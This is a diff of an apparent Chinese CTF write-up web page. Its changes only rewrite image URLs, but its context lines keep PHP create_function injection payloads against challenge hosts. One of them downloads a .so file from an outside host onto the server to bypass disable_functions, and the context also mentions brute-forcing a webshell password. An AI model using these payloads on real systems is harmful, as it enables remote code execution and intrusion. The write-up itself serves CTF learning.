@@ -60,8 +60,7 @@ flag到底在哪啊！！
 <p>题目地址：<a class=link href=http://120.79.1.69:8887/web1/ target=_blank rel=noopener>http://120.79.1.69:8887/web1/</a></p>
 <h3 id=hacking>Hacking</h3>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002592.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002592.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002592.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002592.jpg loading=lazy>
 </a>
 </figure></p>
 <h2 id=web-2-下载下载>Web 2 下载下载</h2>
@@ -204,8 +203,7 @@ if (isset ($_POST['password'])) {
 <h3 id=hacking-3>Hacking</h3>
 <p>猜测有后门，打开 shell.php，爆一下密码为 hack</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003229.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003229.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003229.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003229.jpg loading=lazy>
 </a>
 </figure></p>
 <h2 id=web-5-曲折的人生>Web 5 曲折的人生</h2>
@@ -216,8 +214,7 @@ if (isset ($_POST['password'])) {
 <p>题目地址：<a class=link href=http://120.79.1.69:8887/web5/ target=_blank rel=noopener>http://120.79.1.69:8887/web5/</a></p>
 <h3 id=hacking-4>Hacking</h3>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006734.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006734.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006734.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006734.jpg loading=lazy>
 </a>
 </figure></p>
 <p>随便提交我们可以发现有一个错误返回</p>
@@ -407,22 +404,19 @@ this question is no easy
 <span class=p>}</span>
 </code></pre></div><p>Code Breaking原题，只不过把 arg 的位置换了一下，无伤大雅，依旧可以用<code>){return 123;}</code>这种闭合形式绕过。接下来就是突破 disable_function 的限制了。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009038.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009038.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009038.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009038.jpg loading=lazy>
 </a>
 </figure></p>
 <p>这里我直接用了 0ctf 的解法，因为有现成的 exp 就直接拿去用了。</p>
 <pre tabindex=0><code>http://120.79.1.69:8886/web6/?action=\create_function&amp;arg=){return%202333;}copy(%22http://106.14.153.173:8080/zedd.so%22,%22/www/wwwroot/www.sec.cn/web6/zedd.so%22);%2f%2f
 </code></pre><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006860.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006860.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006860.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006860.jpg loading=lazy>
 </a>
 </figure></p>
 <p>后来看了一下可以简便一点，在<code>_SERVER["SCRIPT_FILENAME"]</code>处发现绝对路径，然后用以下看当前文件</p>
 <pre tabindex=0><code>http://120.79.1.69:8886/web6/?action=\create_function&amp;arg=){return%202333;}var_dump(scandir(%22/www/wwwroot/www.sec.cn/web6%22));%2f%2f
 </code></pre><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003606.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003606.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003606.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003606.jpg loading=lazy>
 </a>
 </figure></p>
 <p>可以看到我之前传上去的<code>.so</code>，也看到了还有两个 webshell ，直接<code>file_get_contents</code>读 flag 即可</p>
